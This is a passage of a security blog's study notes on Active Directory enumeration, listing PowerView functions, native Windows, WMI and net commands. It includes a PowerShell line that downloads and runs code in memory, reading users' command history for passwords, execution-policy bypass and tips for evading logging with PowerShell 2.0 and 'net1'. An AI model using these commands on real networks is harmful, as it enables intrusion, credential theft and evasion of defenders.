</tr>
<tr>
<td>Get-DomainUser</td>
<td>Will return all users or specific user objects in AD</td>
</tr>
<tr>
<td>Get-DomainComputer</td>
<td>Will return all computers or specific computer objects in AD</td>
</tr>
<tr>
<td>Get-DomainGroup</td>
<td>Will return all groups or specific group objects in AD</td>
</tr>
<tr>
<td>Get-DomainOU</td>
<td>Search for all or specific OU objects in AD</td>
</tr>
<tr>
<td>Find-InterestingDomainAcl</td>
<td>Finds object ACLs in the domain with modification rights set to non-built in objects</td>
</tr>
<tr>
<td>Get-DomainGroupMember</td>
<td>Will return the members of a specific domain group</td>
</tr>
<tr>
<td>Get-DomainFileServer</td>
<td>Returns a list of servers likely functioning as file servers</td>
</tr>
<tr>
<td>Get-DomainDFSShare</td>
<td>Returns a list of all distributed file systems for the current (or specified) domain</td>
</tr>
<tr>
<td>GPO Functions:</td>
<td></td>
</tr>
<tr>
<td>Get-DomainGPO</td>
<td>Will return all GPOs or specific GPO objects in AD</td>
</tr>
<tr>
<td>Get-DomainPolicy</td>
<td>Returns the default domain policy or the domain controller policy for the current domain</td>
</tr>
<tr>
<td><strong>Computer Enumeration Functions</strong>:</td>
<td></td>
</tr>
<tr>
<td>Get-NetLocalGroup</td>
<td>Enumerates local groups on the local or a remote machine</td>
</tr>
<tr>
<td>Get-NetLocalGroupMember</td>
<td>Enumerates members of a specific local group</td>
</tr>
<tr>
<td>Get-NetShare</td>
<td>Returns open shares on the local (or a remote) machine</td>
</tr>
<tr>
<td>Get-NetSession</td>
<td>Will return session information for the local (or a remote) machine</td>
</tr>
<tr>
<td>Test-AdminAccess</td>
<td>Tests if the current user has administrative access to the local (or a remote) machine</td>
</tr>
<tr>
<td><strong>Threaded &lsquo;Meta&rsquo;-Functions</strong></td>
<td></td>
</tr>
<tr>
<td>Find-DomainUserLocation</td>
<td>Finds machines where specific users are logged in</td>
</tr>
<tr>
<td>Find-DomainShare</td>
<td>Finds reachable shares on domain machines</td>
</tr>
<tr>
<td>Find-InterestingDomainShareFile</td>
<td>Searches for files matching specific criteria on readable shares in the domain</td>
</tr>
<tr>
<td>Find-LocalAdminAccess</td>
<td>Find machines on the local domain where the current user has local administrator access</td>
</tr>
<tr>
<td><strong>Domain Trust Functions</strong></td>
<td></td>
</tr>
<tr>
<td>Get-DomainTrust</td>
<td>Returns domain trusts for the current domain or a specified domain</td>
</tr>
<tr>
<td>Get-ForestTrust</td>
<td>Returns all forest trusts for the current forest or a specified forest</td>
</tr>
<tr>
<td>Get-DomainForeignUser</td>
<td>Enumerates users who are in groups outside of the user&rsquo;s domain</td>
</tr>
<tr>
<td>Get-DomainForeignGroupMember</td>
<td>Enumerates groups with users outside of the group&rsquo;s domain and returns each foreign member</td>
</tr>
<tr>
<td>Get-DomainTrustMapping</td>
<td>Will enumerate all trusts for the current domain and any others seen.</td>
</tr>
</tbody>
</table>
<p><strong>Domain User Info</strong></p>
<p><code>Get-DomainUser -Identity morgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname, description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol</code></p>
<p><strong><strong><strong>Recursive Group Membership</strong></strong></strong></p>
<p><code>Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse</code> - retrieve group-specific information and recurse which means if it finds any groups that are part of the target group (<strong><strong><strong>nested group membership</strong></strong></strong>) to list out the members of those groups.</p>
<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Trust Enumeration.</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p><code>Get-DomainTrustMapping</code> test for local admin access on either the current machine or the remote one.</p>
<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Testing for Local Admin Access</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p><code>Test-AdminAccess -ComputerName ACADEMY-EA-MS01</code></p>
<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Users with SPN Set</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></p>
<h2 id="shares">Shares<a hidden class="anchor" aria-hidden="true" href="#shares">#</a></h2>
<p>Allows users on the domain to quickly access info relevant to their daily roles and share content with their organization.</p>
<h3 id="snaffler">Snaffler<a hidden class="anchor" aria-hidden="true" href="#snaffler">#</a></h3>
<p>A tool that helps in acquiring credentials or other sensitive data in AD, works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.</p>
<h2 id="living-off-the-land">Living off the Land<a hidden class="anchor" aria-hidden="true" href="#living-off-the-land">#</a></h2>
<p>Discussion on Techniques for utilizing native Windows tools to perform our enumeration is considered a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network.</p>
<p>Most enterprise environments have network monitoring and logging, including IDS/IPS, firewalls and passive sensors and tools on top of their host-based defences Windows Defender or enterprise EDR.</p>
<h3 id="env-enumeration-host--network-recon">Env Enumeration Host &amp; Network Recon<a hidden class="anchor" aria-hidden="true" href="#env-enumeration-host--network-recon">#</a></h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Result</th>
</tr>
</thead>
<tbody>
<tr>
<td>hostname</td>
<td>Prints the PC&rsquo;s Name</td>
</tr>
<tr>
<td>[System.Environment]::OSVersion.Version</td>
<td>Prints out the OS version and revision level</td>
</tr>
<tr>
<td>wmic qfe get Caption,Description,HotFixID,InstalledOn</td>
<td>Prints the patches and hotfixes applied to the host</td>
</tr>
<tr>
<td>ipconfig /all</td>
<td>Prints out network adapter state and configurations</td>
</tr>
<tr>
<td>set %USERDOMAIN%</td>
<td>Displays the domain name to which the host belongs (ran from CMD-prompt)</td>
</tr>
<tr>
<td>set %logonserver%</td>
<td>Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)</td>
</tr>
</tbody>
</table>
<h2 id="powershell">Powershell<a hidden class="anchor" aria-hidden="true" href="#powershell">#</a></h2>
<p>It provides an extensive framework for administering all facets of Windows systems and AD Environments, can be used to dig deep into systems and can be used on engagements to recon the host and network and send and receive files.</p>
<table>
<thead>
<tr>
<th>Cmd-Let</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Get-Module</td>
<td>Lists available modules loaded for use.</td>
</tr>
<tr>
<td>Get-ExecutionPolicy -List</td>
<td>Will print the https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2 settings for each scope on a host.</td>
</tr>
<tr>
<td>Set-ExecutionPolicy Bypass -Scope Process</td>
<td>This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won&rsquo;t be making a permanent change to the victim host.</td>
</tr>
<tr>
<td>Get-Content C:\Users&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</td>
<td>With this string, we can get the specified user&rsquo;s PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.</td>
</tr>
<tr>
<td>Get-ChildItem Env:</td>
<td>ft Key, Value</td>
</tr>
<tr>
<td>powershell -nop -c &ldquo;iex(New-Object Net.WebClient).DownloadString(&lsquo;URL to download the file from&rsquo;); <!-- raw HTML omitted -->&rdquo;</td>
<td>This is a quick and easy way to download a file from the web using PowerShell and call it from memory.</td>
</tr>
</tbody>
</table>
<h2 id="opsec-tactics">OPSec Tactics<a hidden class="anchor" aria-hidden="true" href="#opsec-tactics">#</a></h2>
<p>A few Operational security tactics that defenders are unaware of are that several versions of Powershell often exist on a host. If not uninstalled, they can still be used.</p>
<h3 id="example">Example<a hidden class="anchor" aria-hidden="true" href="#example">#</a></h3>
<blockquote>
<p>Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders&rsquo; radar while utilizing resources built into the hosts to our advantage.</p>
</blockquote>
<h3 id="checking-defenses">Checking Defenses.<a hidden class="anchor" aria-hidden="true" href="#checking-defenses">#</a></h3>
<p>These few commands will utilize the <a href="https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts">netsh</a> and <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query">sc</a> to help get an understanding of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.</p>
<p>Firewall check - <code>netsh advfirewall show allprofiles</code></p>
<p>Defender check cmd - <code>sc query windefend</code></p>
<p>Checking the status and configuration settings - <code>Get-MpComputerStatus</code></p>
<h2 id="am-i-alone">Am I Alone?<a hidden class="anchor" aria-hidden="true" href="#am-i-alone">#</a></h2>
<p>When landing on a host for the first time, it&rsquo;s important to check and see if you are the only one logged in since if you take certain actions from a host someone else is logged on, there is potential for them to identify you.</p>
<p>If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.</p>
<h3 id="network-enumeration">Network Enumeration<a hidden class="anchor" aria-hidden="true" href="#network-enumeration">#</a></h3>
<table>
<thead>
<tr>
<th>Networking Commands</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>arp -a</td>
<td>Lists all known hosts stored in the arp table.</td>
</tr>
<tr>
<td>ipconfig /all</td>
<td>Prints out adapter settings for the host. We can figure out the network segment from here.</td>
</tr>
<tr>
<td>route print</td>
<td>Displays the routing table (IPv4 &amp; IPv6) identifying known networks and layer three routes shared with the host.</td>
</tr>
<tr>
<td>netsh advfirewall shows state</td>
<td>Displays the status of the host&rsquo;s firewall. We can determine if it is active and filtering traffic.</td>
</tr>
</tbody>
</table>
<h3 id="windows-management-instrumentation-wmi">Windows Management Instrumentation (WMI)<a hidden class="anchor" aria-hidden="true" href="#windows-management-instrumentation-wmi">#</a></h3>
<p>This scripting engine is used within Windows enterprises to retrieve info and run admin tasks on local and remote hosts.</p>
<p><strong>Quick WMI checks</strong></p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>wmic qfe get Caption,Description,HotFixID,InstalledOn</td>
<td>Prints the patch level and description of the Hotfixes applied</td>
</tr>
<tr>
<td>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List</td>
<td>Displays basic host information to include any attributes within the list</td>
</tr>
<tr>
<td>wmic process list /format:list</td>
<td>A listing of all processes on host</td>
</tr>
<tr>
<td>wmic ntdomain list /format:list</td>
<td>Displays information about the Domain and Domain Controllers</td>
</tr>
<tr>
<td>wmic useraccount list /format:list</td>
<td>Displays information about all local accounts and any domain accounts that have logged into the device</td>
</tr>
<tr>
<td>wmic group list /format:list</td>
<td>Information about all local groups</td>
</tr>
<tr>
<td>wmic sysaccount list /format:list</td>
<td>Dumps information about any system accounts that are being used as service accounts.</td>
</tr>
</tbody>
</table>
<p>This <a href="https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4">cheatsheet</a> has some useful commands for querying host and domain info using wmic.</p>
<h3 id="net-commands">Net Commands<a hidden class="anchor" aria-hidden="true" href="#net-commands">#</a></h3>
<p>Are useful when enumerating information from the domain, these commands can be used to query the [localhost] and remote hosts.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>net accounts</td>
<td>Information about password requirements</td>
</tr>
<tr>
<td>net accounts /domain</td>
<td>Password and lockout policy</td>
</tr>
<tr>
<td>net group /domain</td>
<td>Information about domain groups</td>
</tr>
<tr>
<td>net group &ldquo;Domain Admins&rdquo; /domain</td>
<td>List users with domain admin privileges</td>
</tr>
<tr>
<td>net group &ldquo;domain computers&rdquo; /domain</td>
<td>List of PCs connected to the domain</td>
</tr>
<tr>
<td>net group &ldquo;Domain Controllers&rdquo; /domain</td>
<td>List PC accounts of domains controllers</td>
</tr>
<tr>
<td>net group &lt;domain_group_name&gt; /domain</td>
<td>User that belongs to the group</td>
</tr>
<tr>
<td>net groups /domain</td>
<td>List of domain groups</td>
</tr>
<tr>
<td>net localgroup</td>
<td>All available groups</td>
</tr>
<tr>
<td>net localgroup administrators /domain</td>
<td>List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)</td>
</tr>
<tr>
<td>net localgroup Administrators</td>
<td>Information about a group (admins)</td>
</tr>
<tr>
<td>net localgroup administrators [username] /add</td>
<td>Add user to administrators</td>
</tr>
<tr>
<td>net share</td>
<td>Check current shares</td>
</tr>
<tr>
<td>net user &lt;ACCOUNT_NAME&gt; /domain</td>
<td>Get information about a user within the domain</td>
</tr>
<tr>
<td>net user /domain</td>
<td>List all users of the domain</td>
</tr>
<tr>
<td>net user %username%</td>
<td>Information about the current user</td>
</tr>
<tr>
<td>net use x: \computer\share</td>
<td>Mount the share locally</td>
</tr>
<tr>
<td>net view</td>
<td>Get a list of computers</td>
</tr>
<tr>
<td>net view /all /domain[:domainname]</td>
<td>Shares on the domains</td>
</tr>
<tr>
<td>net view \computer /ALL</td>
<td>List shares of a computer</td>
</tr>
<tr>
<td>net view /domain</td>
<td>List of PCs of the domain</td>
</tr>
</tbody>
</table>
<h2 id="net-command-tip">Net Command Tip.<a hidden class="anchor" aria-hidden="true" href="#net-command-tip">#</a></h2>
<p>If you are in an environment where network defenders are actively logging/looking for any commands out of the normal you can try typing <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>net1</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> instead of the <strong><strong><strong><strong>net</strong></strong></strong></strong> to work out using the net command.</p>
<h2 id="dsquery">Dsquery<a hidden class="anchor" aria-hidden="true" href="#dsquery">#</a></h2>
<p>A command-line tool that can be used to find Active Directory objects, the queries run with dsquery can be replicated with Bloodhound and Powerview, but one may not have access to those tools.</p>
<p><strong><strong>Dsquery</strong></strong> will exist on any host with the <code>Active Directory Domain Services Role</code> installed, and the <code>dsquery</code> DLL exists on all modern Windows systems by default now and can be found at <code>C:\Windows\System32\dsquery.dll</code></p>
<p>A long read but worthy to check up on those commands one might not remember &hellip;</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://malw0re.github.io/tags/active-directory/">Active-Directory</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://malw0re.github.io/posts/metasploit-ctf/metasploit-1/">
    <span class="title">« Prev</span>
    <br>
    <span>MSF CTF</span>
  </a>
  <a class="next" href="https://malw0re.github.io/posts/active-directory/kerberos-101/">
    <span class="title">Next »</span>
    <br>
    <span>KERBEROS</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://malw0re.github.io/">OUHBOY</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
